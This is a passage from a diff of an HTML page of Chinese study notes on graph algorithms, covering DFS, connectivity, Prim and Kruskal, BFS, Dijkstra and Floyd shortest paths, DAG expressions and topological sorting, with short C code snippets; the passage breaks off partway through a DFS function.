+</span></span></span><span class="line"><span class="cl"><span class="c1">//========= 下面这个函数才是完整的，通用的 深度优先遍历 =========
+</span></span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// 对于处理非连通图的思想是，通过标记数组进行 “断点重新遍历”
+</span></span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">DFSTraverse</span><span class="p">(</span><span class="n">Graph</span> <span class="n">G</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">G</span><span class="p">.</span><span class="n">vexnum</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">visited</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="nb">false</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">G</span><span class="p">.</span><span class="n">vexnum</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">visited</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nf">DFS</span><span class="p">(</span><span class="n">G</span><span class="err">，</span><span class="n">i</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p><img src="http://tuchuang.mrlxl.cn/picture/20260222220424085.png" alt="深度优先遍历示意">
+同样，同一张图使用邻接表存储会有不同的邻接表，其对应的遍历序列也不同。而使用邻接矩阵存储，遍历序列始终唯一。</p>
+<h4 id="6522-性能分析">6.5.2.2 性能分析</h4>
+<p><strong>空间复杂度</strong>来自函数调用栈，最好情况为 <strong>O(1)</strong>，最坏情况（默认情况）为 <strong>O(|V|)</strong>。</p>
+<p><strong>时间复杂度</strong>和 BFS 的分析差不多，分邻接矩阵存储和邻接表存储两种情况，都是一样的。如图所示：
+<img src="http://tuchuang.mrlxl.cn/picture/20260222215244841.png" alt="时间复杂度"></p>
+<h4 id="6523-深度优先生成树">6.5.2.3 深度优先生成树</h4>
+<p>与广度优先生成树类似，是首次访问各结点时所经过的边组成的生成树。</p>
+<h4 id="6524-深度优先生成森林">6.5.2.4 深度优先生成森林</h4>
+<p>非连通图的连通分量的深度优先生成树构成。
+<img src="http://tuchuang.mrlxl.cn/picture/20260222221825279.png" alt="深度优先生成森林"></p>
+<h3 id="653-图的遍历和图的连通性">6.5.3 图的遍历和图的连通性</h3>
+<p>图的遍历算法可用于<strong>判断图的连通性</strong>。
+根据代码区分下面这两段话，不要乱把无向图和有向图类比起来，看代码！！</p>
+<p>对于<strong>无向图</strong>，若图是连通的，则只需一次遍历即可访问所有顶点；若图是非连通的，则一次遍历仅能覆盖其所在连通分量的所有顶点。因此，调用 BFS (G,i) 或 DFS (G,i) 的次数恰好<strong>等于该图的连通分量数</strong>，因为每次调用都会遍历一个连通分量中的所有顶点。</p>
+<p>对于<strong>有向图</strong>，情况略有不同。仅当从初始顶点到达图中每个顶点都存在路径时，才能通过一次遍历访问到所有顶点；否则，将不能访问所有顶点。即使整个图是弱连通的，也可能包含强连通分量和非强连通分量。在非强连通分量中，单次调用 BFS (G,i) 或 DFS (G,i) 不一定能访问到该子图的所有顶点。例如，某些顶点可能无法从初始顶点到达，尽管它们之间可能存在路径。因此，对于有向图，同样需要外层循环以确保所有顶点被覆盖。</p>
+<h2 id="66-最小生成树最小代价树">6.6 最小生成树（最小代价树）</h2>
+<h3 id="661-最小生成树的概念">6.6.1 最小生成树的概念</h3>
+<p>前面已经介绍过生成树的概念（极小连通子图，默认无向图），那么对于<strong>带权连通无向图 G</strong> 而言，不同的生成树其总权重（树中所有边的权值之和）可能不同。具有最小总权重的生成树被称为图 G 的<strong>最小生成树</strong>。
+如图所示：
+<img src="http://tuchuang.mrlxl.cn/picture/20260223143804231.png" alt="最小生成树"></p>
+<h3 id="662-最小生成树算法">6.6.2 最小生成树算法</h3>
+<p>显而易见，同一张图的最小生成树即使使用同一个算法推导，也可能并<strong>不唯一</strong>。下面是关于构造最小生成树的两个算法。</p>
+<h4 id="6621-prim-算法">6.6.2.1 Prim 算法</h4>
+<p><strong>Prim 算法</strong>是一种标准的<strong>贪心算法</strong>，即每一步都取最优解。适合处理<strong>边稠密图</strong>。规则和示意图如下：
+从<strong>某个顶点开始</strong>构建最小生成树,每次将与之相邻的一个代价最小的新顶点纳入生成树,直到纳入所有顶点为止。
+<img src="http://tuchuang.mrlxl.cn/picture/20260223153935338.png" alt="Prim算法">
+<strong>prim 算法的实现</strong>示意图如下，时间复杂度为 <strong>O(|V<sup>2</sup>|)</strong>，我认为主要实现难度在于 lowCost 数组的更新，由于该算法代码在考研中不常考，可以了解一下。
+<img src="http://tuchuang.mrlxl.cn/picture/20260223160231883.png" alt="Prim算法的实现"></p>
+<h4 id="6622-kruskal-算法">6.6.2.2 Kruskal 算法</h4>
+<p>与 Prim 算法每次都从一个顶点开始扩展不同，Kruskal （克鲁斯卡尔）算法采用<strong>按边的权值递增次序选择合适的边</strong>，但明显也是一种<strong>贪心算法</strong>。适合处理<strong>边稀疏图</strong>。规则和示意图如下：
+每次选择一条权值最小的边,使这条边的两头连通,原本已经连通的就不选,直到所有节点都连通。
+<img src="http://tuchuang.mrlxl.cn/picture/20260223154834307.png" alt="Kruskal算法">
+<strong>Kruskal算法的实现</strong>如下，采用并查集进行实现。从权值最小元素开始遍历，“查”到不属于同一个集合，就“并”入同一集合。
+<img src="http://tuchuang.mrlxl.cn/picture/20260223161910917.png" alt="Kruskal算法实现"></p>
+<h2 id="67-最短路径">6.7 最短路径</h2>
+<p>当图是<strong>带权图</strong>时，<strong>带权路径长度</strong>（可能有多条）最小的路径称为<strong>最短路径</strong>。
+求解最短路径问题通常基于其<strong>最优子结构性质：两点间最短路径上的任意子路径，也是对应端点间的最短路径</strong>。
+图的最短路径问题一般分为两类：</p>
+<ol>
+<li><strong>单源最短路径：</strong> 求某个顶点到其余各顶点的最短路径，可用 Dijkstra （迪杰斯特拉）算法求解。</li>
+<li><strong>所有顶点对之间的最短路径：</strong> 可用 Floyd （弗洛伊德）算法求解。</li>
+</ol>
+<h3 id="671-最短路径_bfs">6.7.1 最短路径_BFS</h3>
+<p>使用<strong>广度优先搜索算法</strong>适用于求解<strong>无权图</strong>的最短路径。因为 BFS 具有 “<strong>BFS 第 k 层被访问到的顶点，一定是距离起点 k 条边的最短路径</strong>” 的特点，可能并不唯一，但一定最短。而 DFS 就不行了，因为可能直接一条路访问到终点，一旦 visited 其他的最短路径就不会再被考虑了。
+<img src="http://tuchuang.mrlxl.cn/picture/20260223174038639.png" alt="最短路径_BFS示意">
+那么实现也很简单，把原先的 BFS 算法 visit(v) 部分改改就行，再添加两个数组 d[ ] 和 path[ ] 分别用来记录<strong>每个顶点到源点的最短路径长度</strong>和<strong>每个顶点在该路径下的直接前驱</strong>。那么实现示意图和代码如下：
+<img src="http://tuchuang.mrlxl.cn/picture/20260223180229195.png" alt="实现示意图"></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="c1">//求顶点 u 到其他顶点的最短路径
+</span></span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">BFS_MIN_Distance</span><span class="p">(</span><span class="n">Graph</span> <span class="n">G</span><span class="p">,</span> <span class="kt">int</span> <span class="n">u</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">//d[i]表示从u到i结点的最短路径
+</span></span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">G</span><span class="p">.</span><span class="n">vexnum</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">d</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="err">∞</span><span class="p">;</span>        <span class="c1">//初始化路径长度
+</span></span></span><span class="line"><span class="cl">        <span class="n">path</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>    <span class="c1">//最短路径从哪个顶点过来
+</span></span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="n">d</span><span class="p">[</span><span class="n">u</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">visited</span><span class="p">[</span><span class="n">u</span><span class="p">]</span> <span class="o">=</span> <span class="n">TRUE</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">EnQueue</span><span class="p">(</span><span class="n">Q</span><span class="p">,</span> <span class="n">u</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="p">(</span><span class="o">!</span><span class="nf">isEmpty</span><span class="p">(</span><span class="n">Q</span><span class="p">))</span> <span class="p">{</span>          <span class="c1">//BFS算法主过程
+</span></span></span><span class="line"><span class="cl">        <span class="nf">DeQueue</span><span class="p">(</span><span class="n">Q</span><span class="p">,</span> <span class="n">u</span><span class="p">);</span>             <span class="c1">//队头元素u出队
+</span></span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="p">(</span><span class="n">w</span> <span class="o">=</span> <span class="nf">FirstNeighbor</span><span class="p">(</span><span class="n">G</span><span class="p">,</span> <span class="n">u</span><span class="p">);</span> <span class="n">w</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">w</span> <span class="o">=</span> <span class="nf">NextNeighbor</span><span class="p">(</span><span class="n">G</span><span class="p">,</span> <span class="n">u</span><span class="p">,</span> <span class="n">w</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">visited</span><span class="p">[</span><span class="n">w</span><span class="p">])</span> <span class="p">{</span>      <span class="c1">//w为u的尚未访问的邻接顶点
+</span></span></span><span class="line"><span class="cl">                <span class="n">d</span><span class="p">[</span><span class="n">w</span><span class="p">]</span> <span class="o">=</span> <span class="n">d</span><span class="p">[</span><span class="n">u</span><span class="p">]</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>   <span class="c1">//路径长度为当前出队结点最短路径+1
+</span></span></span><span class="line"><span class="cl">                <span class="n">path</span><span class="p">[</span><span class="n">w</span><span class="p">]</span> <span class="o">=</span> <span class="n">u</span><span class="p">;</span>       <span class="c1">//最短路径应从u到w
+</span></span></span><span class="line"><span class="cl">                <span class="n">visited</span><span class="p">[</span><span class="n">w</span><span class="p">]</span> <span class="o">=</span> <span class="n">TRUE</span><span class="p">;</span> <span class="c1">//设已访问标记
+</span></span></span><span class="line"><span class="cl">                <span class="nf">EnQueue</span><span class="p">(</span><span class="n">Q</span><span class="p">,</span> <span class="n">w</span><span class="p">);</span>     <span class="c1">//顶点w入队
+</span></span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><h3 id="672-最短路径_dijkstra">6.7.2 最短路径_Dijkstra</h3>
+<p>Dijkstra 就是提出 “goto 有害论” 的那牛人，Dijkstra 算法用于求单源最短路径问题。这里用有向图和文字规则对算法做示意说明（有向无向都可以用这个算法）：
+<code>===============文字介绍部分===============</code>
+Dijkstra 算法使用一个集合 S 记录已确定最短路径的顶点。
+初始时，将源点（顶点 0）放入 S；每当将一个新顶点 i 加入 S 后，需要更新源点到所有尚未确定最短路径的顶点（集合 V−S 中的顶点）的当前最短路径长度。</p>
+<p>算法执行过程中维护以下三个辅助数组：</p>
+<ul>
+<li><strong>final[]：</strong> 标记各顶点是否已找到最短路径（是否属于集合 S）。</li>
+<li><strong>dist[]：</strong> 记录从源点到各顶点的当前最短路径长度。初始化时，若存在从源点到顶点 i 的直接边，则 dist[i] 为该边的权值，否则置为 无穷。</li>
+<li><strong>path[]：</strong> path[i] 存储从源点到顶点 i 的最短路径。算法结束后，可通过 path[] 数组回溯，重构出完整的最短路径。</li>
+</ul>
+<p>假设源点为顶点 0，集合 S 初始仅含顶点 0。图以邻接矩阵 arcs 表示，其中 arcs[i][j] 为有向边 &lt;i,j&gt; 的权值；若该边不存在，则 arcs[i][j] = 无穷。</p>
+<p><strong>算法步骤（暂不考虑对 path[] 的操作）:</strong></p>
+<ol>
+<li><strong>初始化：</strong> 集合 S = {0}，dist[] 的初始值为：
+<code>dist[i] = arcs[0][i], i = 1, 2, …, n−1</code></li>
+<li><strong>选择最短路径顶点：</strong> 从不在 S 中的顶点集合 V−S 中选出顶点 j，使得 dist[j] 最小。此时，顶点 j 即为当前从源点出发的最短路径的终点，将其加入集合 S。</li>
+<li><strong>松弛操作：</strong> 对每个从顶点 j 出发的邻接顶点 k（arcs[j][k] ≠ 无穷），若：
+<code>dist[j] + arcs[j][k] &lt; dist[k]</code>
+更新：
+<code>dist[k] = dist[j] + arcs[j][k]</code></li>
+<li>重复步骤 2~3 共 n−1 次，直至所有顶点都包含在集合 S 中。</li>
+</ol>
+<p><code>===============文字介绍部分===============</code></p>
+<p><img src="http://tuchuang.mrlxl.cn/picture/20260223202923542.png" alt="Dijkstra算法说明"></p>
+<p>值得注意的是，Dijkstra 算法在遇到<strong>带有负权值的图</strong>时，可能会<strong>失效</strong>，示意如下：
+<img src="http://tuchuang.mrlxl.cn/picture/20260223204447055.png" alt="Dijkstra算法失效"></p>
+<p>显然，Dijkstra 算法也是一个<strong>贪心算法</strong>，思想和 Prim 算法类似，时间复杂度也一样是 <strong>O(n<sup>2</sup>)</strong> 但可<strong>不能</strong>直接用 Prim 算法的生成树去找各个结点的最短路径，因为：
+<strong>Dijkstra 的贪心对象是“当前源点到各未确定顶点的最短距离”；
+Prim 的贪心对象是“连接已选顶点集合与未选集合的最小权值边”。</strong></p>
+<h3 id="673-最短路径_floyd">6.7.3 最短路径_Floyd</h3>
+<p>Floyd 算法是解决<strong>任意两点间最短路径</strong>的经典算法，适用于带权图，可以处理正权或负权（但不能有带有负权值的环）。</p>
+<ul>
+<li><strong>输入：</strong> 一个图（有向或无向），用邻接矩阵 arcs[i][j] 表示边权；不存在的边用 无穷 表示。</li>
+<li><strong>输出：</strong> 任意两点 i、j 的最短路径长度（<strong>如果需要，还可以重构路径</strong>）。</li>
+</ul>
+<p>Floyd 算法的核心是：
+假设我们只允许路径经过不超过 k 个顶点（中转点），计算每一对顶点的最短路径。从 0 开始逐步增加 k，并不停找更短路径，最终得到完整最短路径。</p>
+<p>过程示例如下：
+<img src="http://tuchuang.mrlxl.cn/picture/20260223213408035.png" alt="Floyd算法过程1">
+<img src="http://tuchuang.mrlxl.cn/picture/20260223213558859.png" alt="Floyd算法过程2">
+得到 A 和 Path 矩阵之后，可通过手算或者递归的方式推导出<strong>最短路径序列</strong>。如图所示：
+<img src="http://tuchuang.mrlxl.cn/picture/20260223221641132.png" alt="Floyd算法推导路径">
+看着复杂，实际算法实现起来很简单，时间复杂度是 <strong>O(|v<sup>3</sup>|)</strong>，<strong>核心代码如下：</strong></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="c1">//......准备工作，根据图的信息初始化矩阵 A 和 path（如上图）
+</span></span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">k</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">k</span><span class="o">&lt;</span><span class="n">n</span><span class="p">;</span> <span class="n">k</span><span class="o">++</span><span class="p">){</span>      <span class="c1">//考虑以 vk 作为中转点
+</span></span></span><span class="line"><span class="cl">    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">i</span><span class="o">&lt;</span><span class="n">n</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>  <span class="c1">//遍历整个矩阵，i为行号，j为列号
+</span></span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">j</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">j</span><span class="o">&lt;</span><span class="n">n</span><span class="p">;</span> <span class="n">j</span><span class="o">++</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="n">A</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="n">j</span><span class="p">]</span><span class="o">&gt;</span><span class="n">A</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="n">k</span><span class="p">]</span><span class="o">+</span><span class="n">A</span><span class="p">[</span><span class="n">k</span><span class="p">][</span><span class="n">j</span><span class="p">]){</span>   <span class="c1">//以 vk 为中转点的路径更短
+</span></span></span><span class="line"><span class="cl">                <span class="n">A</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="n">j</span><span class="p">]</span><span class="o">=</span><span class="n">A</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="n">k</span><span class="p">]</span><span class="o">+</span><span class="n">A</span><span class="p">[</span><span class="n">k</span><span class="p">][</span><span class="n">j</span><span class="p">];</span>    <span class="c1">//更新最短路径长度
+</span></span></span><span class="line"><span class="cl">                <span class="n">path</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="n">j</span><span class="p">]</span><span class="o">=</span><span class="n">k</span><span class="p">;</span>               <span class="c1">//中转点
+</span></span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><h2 id="68-有向无环图描述表达式">6.8 有向无环图描述表达式</h2>
+<p>有向无环图（DAG 图，Directed Acyclic Graph）的概念很简单如下：
+<img src="http://tuchuang.mrlxl.cn/picture/20260224151608954.png" alt="有向无环图的概念">
+使用有向无环图表示表达式其实很简单，难的是怎么使用<strong>最少的结点</strong>表示，示意如下：
+<img src="http://tuchuang.mrlxl.cn/picture/20260224152610722.png" alt="一般有向无环图表示">
+显然，因为存在众多需要合并的点，所以很容易出错。所以有一种系统性的<strong>构建方法</strong>，（听说可能会出错，但没遇到过）示意如下：
+<img src="http://tuchuang.mrlxl.cn/picture/20260224153223481.png" alt="有向无环图构建方法一">
+<img src="http://tuchuang.mrlxl.cn/picture/20260224153411177.png" alt="有向无环图构建方法二">
+若遇到需简化图出现大量子图相同的情况，可如下图这么表示：
+<img src="http://tuchuang.mrlxl.cn/picture/20260224154334577.png" alt="大量子图相同">
+由于操作符<strong>生效顺序</strong>的不同，其最简有向无环图也可能<strong>不同</strong>，但是都应该是最简的。如下图是上图式子的另一种最简表示方法：
+<img src="http://tuchuang.mrlxl.cn/picture/20260224161322608.png" alt="最简有向无环图表示不唯一"></p>
+<h2 id="68-拓扑排序">6.8 拓扑排序</h2>
+<h3 id="681-aov-网">6.8.1 AOV 网</h3>
+<p><strong>AOV 网</strong> (Activity On Vertex NetWork, 用顶点表示活动的网)：
+用 DAG 图 (有向无环图) 表示的一个工程。顶点表示活动，有向边 &lt;V<sub>i</sub>,V<sub>j</sub>&gt; 表示活动 V<sub>i</sub> 必须先于活动 V<sub>j</sub> 进行。
+<img src="http://tuchuang.mrlxl.cn/picture/20260224180323209.png" alt="AOV网">
+可以说 AOV 网就是赋予了一些<strong>现实意义的 DAG 图</strong>。AOV 网中，任意两个顶点都存在<strong>单向路径</strong>（任意两个活动间都有明确的先后顺序）。</p>
+<h3 id="682-拓扑排序">6.8.2 拓扑排序</h3>
+<p><strong>拓扑排序序列（Topological Order）：</strong>
+对有向无环图（AOE,AOV&hellip;）中所有顶点的一种线性序列，使得对任意有向边 u -&gt; v，顶点 u 都排在顶点 v 之前。</p>
+<p><strong>拓扑排序的实现</strong>:</p>
+<ol>
+<li>从 AOV 网中选择一个<strong>没有前驱（入度为 0）</strong> 的顶点并输出。</li>
+<li>从网中删除该顶点和所有以它为起点的有向边。</li>
+<li>重复①和②直到当前的 AOV 网为空或当前网中不存在无前驱的顶点为止。</li>
+</ol>
+<p>那么实现代码和示意图如下（也能使用 DFS 算法实现）：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="c1">//提前初始化两个数组 indegree 表示各个结点的入度，print[] 表示拓扑排序序列
+</span></span></span><span class="line"><span class="cl"><span class="kt">bool</span> <span class="nf">TopologicalSort</span><span class="p">(</span><span class="n">Graph</span> <span class="n">G</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">InitStack</span><span class="p">(</span><span class="n">S</span><span class="p">);</span>        <span class="c1">// 初始化栈，存储入度为0的顶点
+</span></span></span><span class="line"><span class="cl">    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">i</span><span class="o">&lt;</span><span class="n">G</span><span class="p">.</span><span class="n">vexnum</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="n">indegree</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">==</span><span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="nf">Push</span><span class="p">(</span><span class="n">S</span><span class="p">,</span><span class="n">i</span><span class="p">);</span>    <span class="c1">// 将所有入度为0的顶点进栈
+</span></span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">count</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>          <span class="c1">// 计数，记录当前已经输出的顶点数
+</span></span></span><span class="line"><span class="cl">    <span class="k">while</span><span class="p">(</span><span class="o">!</span><span class="nf">IsEmpty</span><span class="p">(</span><span class="n">S</span><span class="p">)){</span>   <span class="c1">// 栈不空，则存在入度为0的顶点
+</span></span></span><span class="line"><span class="cl">        <span class="nf">Pop</span><span class="p">(</span><span class="n">S</span><span class="p">,</span><span class="n">i</span><span class="p">);</span>         <span class="c1">// 栈顶元素出栈
+</span></span></span><span class="line"><span class="cl">        <span class="n">print</span><span class="p">[</span><span class="n">count</span><span class="o">++</span><span class="p">]</span><span class="o">=</span><span class="n">i</span><span class="p">;</span> <span class="c1">// 输出顶点i
+</span></span></span><span class="line"><span class="cl">        <span class="k">for</span><span class="p">(</span><span class="n">p</span><span class="o">=</span><span class="n">G</span><span class="p">.</span><span class="n">vertices</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">firstarc</span><span class="p">;</span> <span class="n">p</span><span class="p">;</span> <span class="n">p</span><span class="o">=</span><span class="n">p</span><span class="o">-&gt;</span><span class="n">nextarc</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">            <span class="c1">// 将所有i指向的顶点的入度减1，并且将入度减为0的顶点压入栈
+</span></span></span><span class="line"><span class="cl">            <span class="n">v</span><span class="o">=</span><span class="n">p</span><span class="o">-&gt;</span><span class="n">adjvex</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="o">--</span><span class="n">indegree</span><span class="p">[</span><span class="n">v</span><span class="p">]))</span>
+</span></span><span class="line"><span class="cl">                <span class="nf">Push</span><span class="p">(</span><span class="n">S</span><span class="p">,</span><span class="n">v</span><span class="p">);</span> <span class="c1">// 入度为0，则入栈
+</span></span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="c1">// while
+</span></span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="n">count</span><span class="o">&lt;</span><span class="n">G</span><span class="p">.</span><span class="n">vexnum</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nb">false</span><span class="p">;</span>     <span class="c1">// 排序失败，有向图中有回路
+</span></span></span><span class="line"><span class="cl">    <span class="k">else</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nb">true</span><span class="p">;</span>      <span class="c1">// 拓扑排序成功
+</span></span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p><img src="http://tuchuang.mrlxl.cn/picture/20260224173458799.png" alt="拓扑排序示意图">
+时间复杂度采用<strong>邻接表</strong>存储时，为 <strong>O(|V|+|E|)</strong>，采用邻接矩阵存储时，为 <strong>O(|V|<sup>2</sup>)</strong>。</p>
+<h3 id="683-逆拓扑排序">6.8.3 逆拓扑排序</h3>
+<p><strong>逆拓扑排序序列（Reverse Topological Order）：</strong>
+对有向无环图（DAG）中所有顶点的一种线性序列，使得对任意有向边 u -&gt; v，顶点 v 都排在顶点 u 之前。</p>
+<p><strong>逆拓扑排序的实现：</strong>
+值得注意的是：由于拓扑排序可能并不唯一，逆拓扑排序不一定是拓扑排序的 “反序列” 。</p>
+<ol>
+<li>从 AOV 网中选择一个<strong>没有后继（出度为 0）</strong> 的顶点并输出。</li>
+<li>从网中删除该顶点和所有以它为起点的有向边。</li>
+<li>重复①和②直到当前的 AOV 网为空或当前网中不存在无前驱的顶点为止。</li>
+</ol>
+<p>这里可以使用 DFS 算法方便的实现逆拓扑排序（也可以用上面的拓扑排序算法改）：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">DFSTraverse</span><span class="p">(</span><span class="n">Graph</span> <span class="n">G</span><span class="p">)</span> <span class="p">{</span>        <span class="c1">// 对图G进行深度优先遍历
+</span></span></span><span class="line"><span class="cl">    <span class="k">for</span><span class="p">(</span><span class="n">v</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">v</span> <span class="o">&lt;</span> <span class="n">G</span><span class="p">.</span><span class="n">vexnum</span><span class="p">;</span> <span class="o">++</span><span class="n">v</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">visited</span><span class="p">[</span><span class="n">v</span><span class="p">]</span> <span class="o">=</span> <span class="n">FALSE</span><span class="p">;</span>        <span class="c1">// 初始化已访问标记数据
+</span></span></span><span class="line"><span class="cl">    <span class="k">for</span><span class="p">(</span><span class="n">v</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">v</span> <span class="o">&lt;</span> <span class="n">G</span><span class="p">.</span><span class="n">vexnum</span><span class="p">;</span> <span class="o">++</span><span class="n">v</span><span class="p">)</span>  <span class="c1">// 本代码中是从v=0开始遍历
+</span></span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">visited</span><span class="p">[</span><span class="n">v</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl">            <span class="nf">DFS</span><span class="p">(</span><span class="n">G</span><span class="p">,</span> <span class="n">v</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">DFS</span><span class="p">(</span><span class="n">Graph</span> <span class="n">G</span><span class="p">,</span> <span class="kt">int</span> <span class="n">v</span><span class="p">)</span> <span class="p">{</span>         <span class="c1">// 从顶点v出发，深度优先遍历图
+</span></span></span><span class="line"><span class="cl">    <span class="n">visited</span><span class="p">[</span><span class="n">v</span><span class="p">]</span> <span class="o">=</span> <span class="n">TRUE</span><span class="p">;</span>             <span class="c1">// 设已访问标记
+</span></span></span><span class="line"><span class="cl">    <span class="k">for</span><span class="p">(</span><span class="n">w</span> <span class="o">=</span> <span class="nf">FirstNeighbor</span><span class="p">(</span><span class="n">G</span><span class="p">,</span> <span class="n">v</span><span class="p">);</span> <span class="n">w</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">w</span> <span class="o">=</span> <span class="nf">NextNeighbor</span><span class="p">(</span><span class="n">G</span><span class="p">,</span> <span class="n">v</span><span class="p">,</span> <span class="n">w</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">visited</span><span class="p">[</span><span class="n">w</span><span class="p">])</span> <span class="p">{</span>          <span class="c1">// w为u的尚未访问的邻接顶点
+</span></span></span><span class="line"><span class="cl">            <span class="nf">DFS</span><span class="p">(</span><span class="n">G</span><span class="p">,</span> <span class="n">w</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="c1">// if
